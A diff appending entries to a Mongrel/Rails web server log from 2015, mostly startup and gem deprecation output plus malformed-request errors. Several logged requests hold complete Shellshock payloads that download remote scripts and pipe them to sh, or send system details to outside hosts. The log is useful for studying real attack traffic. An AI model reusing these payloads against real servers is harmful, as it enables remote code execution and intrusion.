@@ -4559,3 +4559,1831 @@ Gem::SourceIndex#each called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/ge
 ** Rails signals registered.  HUP => reload (without restart).  It might not work well.
 ** Mongrel 1.1.5 available at 0.0.0.0:80
 ** Writing PID file to log/mongrel.pid
+Tue Apr 21 05:19:57 -0430 2015: HTTP parse error, malformed request (95.173.190.6): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Tue Apr 21 05:19:57 -0430 2015: REQUEST DATA: "GET /\n"
+---
+PARAMS: {"REQUEST_METHOD"=>"GET"}
+---
+Thu Apr 23 14:19:58 -0430 2015: HTTP parse error, malformed request (95.173.171.236): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Thu Apr 23 14:19:58 -0430 2015: REQUEST DATA: "GET /\n"
+---
+PARAMS: {"REQUEST_METHOD"=>"GET"}
+---
+Fri Apr 24 02:36:12 -0430 2015: HTTP parse error, malformed request (69.30.240.46): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Fri Apr 24 02:36:12 -0430 2015: REQUEST DATA: "GET /\n"
+---
+PARAMS: {"REQUEST_METHOD"=>"GET"}
+---
+Fri Apr 24 12:29:24 -0430 2015: HTTP parse error, malformed request (203.146.249.63): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Fri Apr 24 12:29:24 -0430 2015: REQUEST DATA: "GET HTTP/1.1 HTTP/1.1\r\nAccept: */*\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://88.198.96.10/wget ; curl http://88.198.96.10/curl ; fetch http://88.198.96.10/fetch ; lwp-download http://88.198.96.10/lwp-download ; GET http://88.198.96.10/GET ; lynx http://88.198.96.10/lynx \");'\r\nHost: 159.90.14.230\r\nConnection: Close\r\n\r\n"
+---
+PARAMS: {"REQUEST_METHOD"=>"GET"}
+---
+Fri Apr 24 18:59:17 -0430 2015: HTTP parse error, malformed request (85.214.28.209): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Fri Apr 24 18:59:17 -0430 2015: REQUEST DATA: "GET HTTP/1.1 HTTP/1.1\r\nAccept: */*\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http//luxsocks.ru ; wget https://luxsocks.ru --no-check-certificate ; curl http//luxsocks.ru// ; curl -k https://luxsocks.ru ; lwp-download http://luxsocks.ru ; GET http://luxsocks.ru ; lynx http://luxsocks.ru ; wget http://174.122.42.230/luxx ; curl http://174.122.42.230/luxx ; fetch http://174.122.42.230/luxx ; lwp-download http://174.122.42.230/luxx ; GET http://174.122.42.230/luxx ; lynx http://174.122.42.230/luxx\");'\r\nHost: 159.90.14.230\r\nConnection: Close\r\n\r\n"
+---
+PARAMS: {"REQUEST_METHOD"=>"GET"}
+---
+Fri Apr 24 19:01:53 -0430 2015: HTTP parse error, malformed request (87.106.142.246): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Fri Apr 24 19:01:53 -0430 2015: REQUEST DATA: "GET HTTP/1.1 HTTP/1.1\r\nAccept: */*\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://88.198.96.10/wget ; curl http://88.198.96.10/curl ; fetch http://88.198.96.10/fetch ; lwp-download http://88.198.96.10/lwp-download ; GET http://88.198.96.10/GET ; lynx http://88.198.96.10/lynx \");'\r\nHost: 159.90.14.230\r\nConnection: Close\r\n\r\n"
+---
+PARAMS: {"REQUEST_METHOD"=>"GET"}
+---
+Fri Apr 24 23:45:10 -0430 2015: HTTP parse error, malformed request (119.18.153.201): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Fri Apr 24 23:45:10 -0430 2015: REQUEST DATA: "GET HTTP/1.1 HTTP/1.1\r\nAccept: */*\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http//luxsocks.ru ; wget https://luxsocks.ru --no-check-certificate ; curl http//luxsocks.ru// ; curl -k https://luxsocks.ru ; lwp-download http://luxsocks.ru ; GET http://luxsocks.ru ; lynx http://luxsocks.ru ; wget http://174.122.42.230/luxx ; curl http://174.122.42.230/luxx ; fetch http://174.122.42.230/luxx ; lwp-download http://174.122.42.230/luxx ; GET http://174.122.42.230/luxx ; lynx http://174.122.42.230/luxx\");'\r\nHost: 159.90.14.230\r\nConnection: Close\r\n\r\n"
+---
+PARAMS: {"REQUEST_METHOD"=>"GET"}
+---
+Sat Apr 25 02:05:26 -0430 2015: HTTP parse error, malformed request (125.69.80.32): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Sat Apr 25 02:05:26 -0430 2015: REQUEST DATA: "GET HTTP/1.1 HTTP/1.1\r\nAccept: */*\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http//luxsocks.ru ; wget https://luxsocks.ru --no-check-certificate ; curl http//luxsocks.ru// ; curl -k https://luxsocks.ru ; lwp-download http://luxsocks.ru ; GET http://luxsocks.ru ; lynx http://luxsocks.ru ; wget http://174.122.42.230/luxx ; curl http://174.122.42.230/luxx ; fetch http://174.122.42.230/luxx ; lwp-download http://174.122.42.230/luxx ; GET http://174.122.42.230/luxx ; lynx http://174.122.42.230/luxx\");'\r\nHost: 159.90.14.230\r\nConnection: Close\r\n\r\n"
+---
+PARAMS: {"REQUEST_METHOD"=>"GET"}
+---
+Sat Apr 25 02:38:00 -0430 2015: HTTP parse error, malformed request (208.93.209.237): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Sat Apr 25 02:38:00 -0430 2015: REQUEST DATA: "GET HTTP/1.1 HTTP/1.1\r\nAccept: */*\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http//luxsocks.ru ; wget https://luxsocks.ru --no-check-certificate ; curl http//luxsocks.ru// ; curl -k https://luxsocks.ru ; lwp-download http://luxsocks.ru ; GET http://luxsocks.ru ; lynx http://luxsocks.ru ; wget http://174.122.42.230/luxx ; curl http://174.122.42.230/luxx ; fetch http://174.122.42.230/luxx ; lwp-download http://174.122.42.230/luxx ; GET http://174.122.42.230/luxx ; lynx http://174.122.42.230/luxx\");'\r\nHost: 159.90.14.230\r\nConnection: Close\r\n\r\n"
+---
+PARAMS: {"REQUEST_METHOD"=>"GET"}
+---
+Sat Apr 25 09:52:32 -0430 2015: HTTP parse error, malformed request (218.56.45.132): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Sat Apr 25 09:52:32 -0430 2015: REQUEST DATA: "GET HTTP/1.1 HTTP/1.1\r\nAccept: */*\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: () { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http//luxsocks.ru ; wget https://luxsocks.ru --no-check-certificate ; curl http//luxsocks.ru// ; curl -k https://luxsocks.ru ; lwp-download http://luxsocks.ru ; GET http://luxsocks.ru ; lynx http://luxsocks.ru ; wget http://174.122.42.230/luxx ; curl http://174.122.42.230/luxx ; fetch http://174.122.42.230/luxx ; lwp-download http://174.122.42.230/luxx ; GET http://174.122.42.230/luxx ; lynx http://174.122.42.230/luxx\");'\r\nHost: 159.90.14.230\r\nConnection: Close\r\n\r\n"
+---
+PARAMS: {"REQUEST_METHOD"=>"GET"}
+---
+Sat Apr 25 14:33:26 -0430 2015: HTTP parse error, malformed request (69.30.240.46): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Sat Apr 25 14:33:26 -0430 2015: REQUEST DATA: "GET /\n"
+---
+PARAMS: {"REQUEST_METHOD"=>"GET"}
+---
+Mon May 04 16:17:21 -0430 2015: HTTP parse error, malformed request (46.151.212.26): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Mon May 04 16:17:21 -0430 2015: REQUEST DATA: "GET / HTTP/1.0\r\nUser-Agent: () { :; }; /usr/bin/wget -qO- http://r0r.me/r/x.sh | sh \r\nHost: () { :; }; /usr/bin/wget -qO- http://r0r.me/r/x.sh | sh \r\nReferer: () { :; }; /usr/bin/wget -qO- http://r0r.me/r/x.sh | sh \r\nCookie: () { :; }; /usr/bin/wget -qO- http://r0r.me/r/x.sh | sh \r\nConnection: () { :; }; /usr/bin/wget -qO- http://r0r.me/r/x.sh | sh \r\nContent-Length: () { :; }; /usr/bin/wget -qO- http://r0r.me/r/x.sh | sh | perl \r\n () { :; }; /usr/bin/wget -qO- http://r0r.me/r/x.sh | sh \r\n"
+---
+PARAMS: {"REQUEST_URI"=>"/", "HTTP_VERSION"=>"HTTP/1.0", "HTTP_REFERER"=>"() { :; }; /usr/bin/wget -qO- http://r0r.me/r/x.sh | sh ", "HTTP_USER_AGENT"=>"() { :; }; /usr/bin/wget -qO- http://r0r.me/r/x.sh | sh ", "HTTP_HOST"=>"() { :; }; /usr/bin/wget -qO- http://r0r.me/r/x.sh | sh ", "REQUEST_METHOD"=>"GET", "HTTP_CONTENT_LENGTH"=>"() { :; }; /usr/bin/wget -qO- http://r0r.me/r/x.sh | sh | perl ", "HTTP_COOKIE"=>"() { :; }; /usr/bin/wget -qO- http://r0r.me/r/x.sh | sh ", "REQUEST_PATH"=>"/", "HTTP_CONNECTION"=>"() { :; }; /usr/bin/wget -qO- http://r0r.me/r/x.sh | sh "}
+---
+Wed May 06 22:16:51 -0430 2015: HTTP parse error, malformed request (69.30.240.46): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Wed May 06 22:16:51 -0430 2015: REQUEST DATA: "GET /\n"
+---
+PARAMS: {"REQUEST_METHOD"=>"GET"}
+---
+Tue May 12 04:45:10 -0430 2015: HTTP parse error, malformed request (46.151.212.26): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Tue May 12 04:45:10 -0430 2015: REQUEST DATA: "GET /cgi-bin/ HTTP/1.0\r\nUser-Agent: () { :; }; /usr/bin/wget -qO - http://x.saudi.su:404/gate.asp?info-`uname`-`uname -p`-`whoami`-`wget -U curl -qO- ifconfig.me` \r\nHost: () { :; }; /usr/bin/wget -qO - http://x.saudi.su:404/gate.asp?info-`uname`-`uname -p`-`whoami`-`wget -U curl -qO- ifconfig.me` \r\nReferer: () { :; }; /usr/bin/wget -qO - http://x.saudi.su:404/gate.asp?info-`uname`-`uname -p`-`whoami`-`wget -U curl -qO- ifconfig.me` \r\nCookie: () { :; }; /usr/bin/wget -qO - http://x.saudi.su:404/gate.asp?info-`uname`-`uname -p`-`whoami`-`wget -U curl -qO- ifconfig.me` \r\nConnection: () { :; }; /usr/bin/wget -qO - http://x.saudi.su:404/gate.asp?info-`uname`-`uname -p`-`whoami`-`wget -U curl -qO- ifconfig.me` \r\nContent-Length: () { :; }; /usr/bin/wget -qO - http://x.saudi.su:404/gate.asp?info-`uname`-`uname -p`-`whoami`-`wget -U curl -qO- ifconfig.me` \r\n () { :; }; /usr/bin/wget -qO - http://x.saudi.su:404/gate.asp?info-`uname`-`uname -p`-`whoami`-`wget -U curl -qO- ifconfig.me` \r\n"
+---
+PARAMS: {"REQUEST_URI"=>"/cgi-bin/", "HTTP_VERSION"=>"HTTP/1.0", "HTTP_REFERER"=>"() { :; }; /usr/bin/wget -qO - http://x.saudi.su:404/gate.asp?info-`uname`-`uname -p`-`whoami`-`wget -U curl -qO- ifconfig.me` ", "HTTP_USER_AGENT"=>"() { :; }; /usr/bin/wget -qO - http://x.saudi.su:404/gate.asp?info-`uname`-`uname -p`-`whoami`-`wget -U curl -qO- ifconfig.me` ", "HTTP_HOST"=>"() { :; }; /usr/bin/wget -qO - http://x.saudi.su:404/gate.asp?info-`uname`-`uname -p`-`whoami`-`wget -U curl -qO- ifconfig.me` ", "REQUEST_METHOD"=>"GET", "HTTP_CONTENT_LENGTH"=>"() { :; }; /usr/bin/wget -qO - http://x.saudi.su:404/gate.asp?info-`uname`-`uname -p`-`whoami`-`wget -U curl -qO- ifconfig.me` ", "HTTP_COOKIE"=>"() { :; }; /usr/bin/wget -qO - http://x.saudi.su:404/gate.asp?info-`uname`-`uname -p`-`whoami`-`wget -U curl -qO- ifconfig.me` ", "REQUEST_PATH"=>"/cgi-bin/", "HTTP_CONNECTION"=>"() { :; }; /usr/bin/wget -qO - http://x.saudi.su:404/gate.asp?info-`uname`-`uname -p`-`whoami`-`wget -U curl -qO- ifconfig.me` "}
+---
+** TERM signal received.
+** Daemonized, any open files are closed.  Look at log/mongrel.pid and log/mongrel.log for info.
+** Starting Mongrel listening at 0.0.0.0:80
+** Starting Rails with development environment...
+NOTE: Gem.cache is deprecated, use Gem::source_index. It will be removed on or after 2011-08-01.
+Gem.cache called from /opt/argus/ARGUs/config/boot.rb:26.
+NOTE: Gem.source_index is deprecated, use Specification. It will be removed on or after 2011-11-01.
+Gem.source_index called from /usr/lib/ruby/vendor_ruby/1.8/rubygems.rb:1175.
+NOTE: Gem::SourceIndex#search is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#search called from /opt/argus/ARGUs/config/boot.rb:26.
+/usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:Warning: Gem::SourceIndex#search support for String patterns is deprecated, use #find_name
+** Rails loaded.
+** Loading any Rails specific GemPlugins
+NOTE: Gem::SourceIndex.from_installed_gems is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_installed_gems called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:109.
+NOTE: from_installed_gems(arg) is deprecated. From /usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:in `send'
+NOTE: Gem::SourceIndex.from_gems_in is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:50.
+NOTE: Gem::SourceIndex#initialize is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#initialize called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:67.
+NOTE: Gem::SourceIndex#spec_dirs= is deprecated, use Specification.dirs=. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#spec_dirs= called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:94.
+NOTE: Gem::SourceIndex#refresh! is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#refresh! called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:95.
+NOTE: Gem::SourceIndex#load_gems_in is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#load_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:322.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#each is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#each called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:112.
+** Signals ready.  TERM => stop.  USR2 => restart.  INT => stop (no restart).
+** Rails signals registered.  HUP => reload (without restart).  It might not work well.
+** Mongrel 1.1.5 available at 0.0.0.0:80
+** Writing PID file to log/mongrel.pid
+Thu May 14 04:09:48 -0430 2015: HTTP parse error, malformed request (93.174.93.218): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Thu May 14 04:09:48 -0430 2015: REQUEST DATA: "\004\001\000PÀ\261\2520\000"
+---
+PARAMS: {}
+---
+Thu May 14 04:09:49 -0430 2015: HTTP parse error, malformed request (93.174.93.218): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Thu May 14 04:09:49 -0430 2015: REQUEST DATA: "\005\001\000"
+---
+PARAMS: {}
+---
+Thu May 14 04:09:50 -0430 2015: HTTP parse error, malformed request (93.174.93.218): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Thu May 14 04:09:50 -0430 2015: REQUEST DATA: "\005\001\000"
+---
+PARAMS: {}
+---
+Thu May 14 04:10:39 -0430 2015: HTTP parse error, malformed request (93.174.93.218): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Thu May 14 04:10:39 -0430 2015: REQUEST DATA: "\004\001\000PÀ\261\2520\000"
+---
+PARAMS: {}
+---
+Thu May 14 04:10:41 -0430 2015: HTTP parse error, malformed request (93.174.93.218): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Thu May 14 04:10:41 -0430 2015: REQUEST DATA: "\005\001\000"
+---
+PARAMS: {}
+---
+Thu May 14 04:10:42 -0430 2015: HTTP parse error, malformed request (93.174.93.218): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Thu May 14 04:10:42 -0430 2015: REQUEST DATA: "\005\001\000"
+---
+PARAMS: {}
+---
+Sun May 17 19:24:55 -0430 2015: HTTP parse error, malformed request (69.30.240.46): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Sun May 17 19:24:55 -0430 2015: REQUEST DATA: "GET /\n"
+---
+PARAMS: {"REQUEST_METHOD"=>"GET"}
+---
+Error sending file /opt/argus/ARGUs/public/images/logo-usb.png: Broken pipe
+Tue May 19 12:08:41 -0430 2015: HTTP parse error, malformed request (69.30.240.46): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Tue May 19 12:08:41 -0430 2015: REQUEST DATA: "GET /\n"
+---
+PARAMS: {"REQUEST_METHOD"=>"GET"}
+---
+Wed May 20 06:49:05 -0430 2015: HTTP parse error, malformed request (169.229.3.93): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Wed May 20 06:49:05 -0430 2015: REQUEST DATA: "\377\377\377\377@\001s\000"
+---
+PARAMS: {}
+---
+Wed May 20 06:49:05 -0430 2015: HTTP parse error, malformed request (169.229.3.94): #<Mongrel::HttpParserError: Invalid HTTP format, parsing fails.>
+Wed May 20 06:49:05 -0430 2015: REQUEST DATA: "\377\377\377\377@\001r\000"
+---
+PARAMS: {}
+---
+** TERM signal received.
+** Daemonized, any open files are closed.  Look at log/mongrel.pid and log/mongrel.log for info.
+** Starting Mongrel listening at 0.0.0.0:80
+** Starting Rails with development environment...
+NOTE: Gem.cache is deprecated, use Gem::source_index. It will be removed on or after 2011-08-01.
+Gem.cache called from /opt/argus/ARGUs/config/boot.rb:26.
+NOTE: Gem.source_index is deprecated, use Specification. It will be removed on or after 2011-11-01.
+Gem.source_index called from /usr/lib/ruby/vendor_ruby/1.8/rubygems.rb:1175.
+NOTE: Gem::SourceIndex#search is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#search called from /opt/argus/ARGUs/config/boot.rb:26.
+/usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:Warning: Gem::SourceIndex#search support for String patterns is deprecated, use #find_name
+** Rails loaded.
+** Loading any Rails specific GemPlugins
+NOTE: Gem::SourceIndex.from_installed_gems is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_installed_gems called from /var/lib/gems/1.8/gems/gem_plugin-0.2.3/lib/gem_plugin.rb:109.
+NOTE: from_installed_gems(arg) is deprecated. From /usr/lib/ruby/vendor_ruby/1.8/rubygems/deprecate.rb:63:in `send'
+NOTE: Gem::SourceIndex.from_gems_in is deprecated with no replacement. It will be removed on or after 2011-10-01.
+Gem::SourceIndex.from_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:50.
+NOTE: Gem::SourceIndex#initialize is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#initialize called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:67.
+NOTE: Gem::SourceIndex#spec_dirs= is deprecated, use Specification.dirs=. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#spec_dirs= called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:94.
+NOTE: Gem::SourceIndex#refresh! is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#refresh! called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:95.
+NOTE: Gem::SourceIndex#load_gems_in is deprecated with no replacement. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#load_gems_in called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:322.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
+NOTE: Gem::SourceIndex#add_spec is deprecated, use Specification.add_spec. It will be removed on or after 2011-11-01.
+Gem::SourceIndex#add_spec called from /usr/lib/ruby/vendor_ruby/1.8/rubygems/source_index.rb:127.
